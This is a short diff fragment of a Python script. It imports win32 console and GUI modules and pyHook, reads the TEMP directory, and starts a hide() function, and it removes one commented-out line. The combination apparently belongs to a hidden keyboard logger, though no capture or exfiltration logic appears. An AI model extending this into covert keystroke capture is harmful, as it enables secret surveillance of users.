@@ -3,7 +3,6 @@ import win32console, win32gui, win32event, win32api, winerror
 from sys import exit
 import pythoncom, pyHook
 
-# sys.stderr = None
 TMP = os.environ["TEMP"]
 
 def hide():
